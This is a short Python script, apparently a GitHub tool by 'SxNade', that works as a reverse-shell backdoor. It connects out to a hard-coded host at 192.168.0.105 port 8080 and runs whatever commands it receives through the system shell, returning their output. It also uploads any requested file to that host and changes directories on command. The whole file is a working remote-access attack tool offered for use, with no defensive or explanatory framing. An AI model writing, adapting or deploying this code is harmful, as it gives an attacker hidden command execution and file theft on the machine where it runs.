#By SxNade
#https://github.com/SxNade
#CONTRIBUTE

import socket
import subprocess
from termcolor import colored
import os


def transfer(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while len(packet) > 0:
            s.send(packet)
            packet = f.read(1024)
        s.send('[+]DONE'.encode())
    else:
        s.send('FILE NOT FOUND'.encode())
def connecting():
    s = socket.socket()
    s.connect(("192.168.0.105", 8080))

    while True:
        command = s.recv(8192)
        if 'exit' in command.decode():
            s.close
            break
        elif 'grab' in command.decode():
            grab, path = command.decode().split("*")
            try:
                transfer(s, path)
            except:
                pass
        elif 'cd' in command.decode():
            code, directory = command.decode().split('*')
            try:
                os.chdir(directory)
                s.send(('[+]Current dir is ' + os.getcwd()).encode())
            except Exception as e:
                s.send(('[-] ' + str(e)).encode())
        else:
            CMD = subprocess.Popen(command.decode(), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
            s.send(CMD.stdout.read())
            s.send(CMD.stderr.read())

def main():
    connecting()

main()
